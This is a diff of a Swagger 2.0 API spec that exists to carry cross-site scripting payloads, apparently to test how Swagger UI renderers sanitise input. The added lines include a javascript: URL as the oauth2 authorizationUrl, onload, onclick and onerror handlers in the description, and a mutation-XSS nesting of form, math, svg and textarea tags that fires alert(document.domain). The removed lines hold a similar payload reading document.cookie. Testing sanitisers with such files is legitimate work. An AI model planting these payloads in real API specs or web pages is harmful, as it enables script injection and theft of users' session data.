@@ -1,33 +1,27 @@
 swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
 info:
-  title: XSS Attack BY M0X0101
-  description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
+  version: "1.0.0"
+  title: XSS img Test 2 by Drocapy
+  description: onload="alert(1)" <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">
 paths:
-  /M0X0101:
+  /Drocapy:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - Drocapy
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>"><img onerror=alert(document.domain) src=1>"></form>
           format: int64
           in: path
           name: id
